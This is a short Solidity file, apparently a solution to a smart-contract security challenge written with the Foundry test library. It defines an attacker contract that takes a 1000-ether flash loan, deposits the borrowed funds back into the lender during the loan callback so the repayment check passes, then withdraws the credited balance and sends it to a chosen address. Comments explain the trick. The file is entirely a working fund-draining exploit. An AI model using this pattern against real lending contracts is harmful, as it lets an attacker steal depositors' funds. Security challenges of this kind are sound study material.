// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "forge-std/Test.sol";

interface ILender {
    function flashLoan(uint256 amount) external;

    function withdraw() external;

    function deposit() external payable;
}

contract AttackerContract {
    ILender lenderContract;

    constructor(address lenderAddr) {
        lenderContract = ILender(lenderAddr);
    }

    function exploit(address _to) external {
        //What you can do is borrow ETH from the lender,
        lenderContract.flashLoan(1000 ether);
        lenderContract.withdraw();
        payable(_to).transfer(1000 ether);
    }

    function execute() external payable {
        //deposit borrowed ETH to the lender (so now ETH is in yor balance and contract balance is still 1000ETH)
        lenderContract.deposit{value: 1000 ether}();
        //This way you can pass and pay the flashloan:
        //if (address(this).balance < balanceBefore)
    }

    receive() external payable {}
}
